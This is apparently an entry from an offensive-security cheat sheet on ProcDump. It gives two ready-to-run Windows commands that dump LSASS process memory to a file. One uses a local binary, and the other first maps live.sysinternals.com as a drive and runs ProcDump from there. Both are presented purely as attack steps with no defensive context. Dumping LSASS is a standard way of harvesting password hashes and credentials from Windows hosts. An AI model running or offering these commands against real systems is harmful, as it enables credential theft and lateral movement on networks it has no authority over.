# ProcDump

## lsass

### Local LSASS dump

Dump LSASS with a local ProcDump binary.

```cmd title:"Dump LSASS with local ProcDump"
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
<!-- cheat -->

### Live Sysinternals LSASS dump

Map live.sysinternals.com and dump LSASS with ProcDump.

```cmd title:"Dump LSASS with ProcDump from live.sysinternals.com"
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
<!-- cheat -->
